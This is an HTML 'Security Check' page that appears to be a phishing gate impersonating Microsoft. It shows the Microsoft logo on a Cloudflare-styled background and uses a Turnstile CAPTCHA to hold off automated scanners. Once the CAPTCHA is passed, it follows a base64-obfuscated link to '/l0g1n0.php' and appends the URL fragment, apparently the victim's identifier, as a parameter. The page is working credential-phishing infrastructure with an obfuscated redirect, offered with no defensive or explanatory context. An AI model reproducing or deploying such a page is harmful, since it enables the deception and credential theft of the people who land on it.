<!DOCTYPE html>
<html lang="en">
<head>
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Security Check</title>
<script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit" async defer></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js" 
        integrity="sha512-bLT0Qm9VnAYZDflyKcBaQ2gg0hSYNQrJ8RilYldYQ1FxQYoCLtUjuuRuZo+fjqhx/qtq/1itJ0C2ejDxltZVFg==" 
        crossorigin="anonymous"></script>
<script>
  // Initialize a variable to store the CAPTCHA response
  let token = null;

  // Render the Turnstile widget after the API loads
  function renderTurnstile() {
    turnstile.render('#turnstile-container', {
      sitekey: '0x4AAAAAAEODDcp3RhIAvKX-', // Your site key
      callback: function(response) {
        token = response;
      }
    });
  }

  // Wait for the API to load before rendering
  window.onload = function() {
    if (typeof turnstile !== 'undefined') {
      renderTurnstile();
    } else {
      setTimeout(renderTurnstile, 500);
    }
  };

  // Your URL decoding logic
  let link = "Li9sMGcxbjAucGhw"; // base64 for /l0g1n0.php
  let base = window.location.hash.substring(1);
  let decodedLink = atob(link);
  let correctUrl = decodedLink + "?info=" + base;

  // Redirect function called on button click
  function redirectAfterCaptcha() {
    if (token) {
      window.location.href = correctUrl;
    } else {
      alert("Please complete the CAPTCHA verification.");
    }
  }
</script>
<style>
  body {
    background-image: url('https://www.cloudflare.com/img/cf-bg.jpg');
    background-size: cover;
    background-repeat: no-repeat;
    background-position: center;
    font-family: 'Open Sans', sans-serif;
    margin: 0;
    padding: 0;
    height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    color: #333;
  }
  .container {
    background: rgba(255,255,255,0.9);
    padding: 45px;
    max-width: 400px;
    width: 100%;
    border-radius: 10px;
    box-shadow: 0 0 19px #c2c2c2;
    text-align: center;
  }
  .logo {
    width: 130px;
    height: 30px;
    margin-bottom: 20px;
  }
  .btnSubmit {
    margin-top: 15px;
    border: 0;
    padding: 10px 20px;
    font-size: 18px;
    background-color: #0f6cbd;
    color: #fff;
    cursor: pointer;
    border-radius: 5px;
  }
  #turnstile-container {
    margin: 20px 0;
  }
</style>
</head>
<body>
  <div class="container">
    <!-- Logo -->
    <img src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Logo" class="logo" />

    <!-- Turnstile CAPTCHA -->
    <div id="turnstile-container"></div>

    <!-- Submit Button -->
    <button onclick="redirectAfterCaptcha()" class="btnSubmit">Verify & Continue</button>
  </div>
</body>
</html>